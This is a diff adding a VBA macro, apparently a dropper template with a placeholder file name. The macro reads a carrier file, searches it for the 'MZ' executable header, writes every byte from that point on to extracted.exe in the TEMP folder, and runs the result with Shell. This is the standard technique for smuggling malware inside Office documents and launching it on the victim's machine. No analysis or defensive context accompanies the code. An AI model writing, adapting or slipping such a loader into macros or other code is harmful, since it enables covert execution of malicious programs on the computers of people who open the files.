@@ -1,0 +1,46 @@
+Sub Extract()
+
+    Dim peBin%
+    Dim byt As Byte
+    Dim memArray() As Variant
+    
+    peBin = FreeFile
+    FName = "aREPLACEMEa"
+    outName = Environ$("TEMP") + "\extracted.exe"
+    Open FName For Binary Access Read As peBin
+
+    cnt = 0
+    
+    Do While Not EOF(peBin)
+        Get peBin, , byt
+        If Hex(byt) = "4D" Then
+            ReDim Preserve memArray(cnt)
+            memArray(cnt) = Hex(byt)
+            cnt = cnt + 1
+            Get peBin, , byt
+            If Hex(byt) = "5A" Then
+                ReDim Preserve memArray(cnt)
+                memArray(cnt) = Hex(byt)
+                cnt = cnt + 1
+                Get peBin, , byt
+                Do While Not EOF(peBin)
+                    ReDim Preserve memArray(cnt)
+                    memArray(cnt) = Hex(byt)
+                    cnt = cnt + 1
+                    Get peBin, , byt
+                Loop
+            End If
+        End If
+    Loop
+    
+    Close peBin
+
+    Open (outName) For Binary Lock Read Write As #1
+    For a = 0 To UBound(memArray)
+        Put #1, , CByte("&h" & memArray(a))
+    Next a
+    Close
+
+    Call Shell(outName, vbNormalFocus)
+
+End Sub
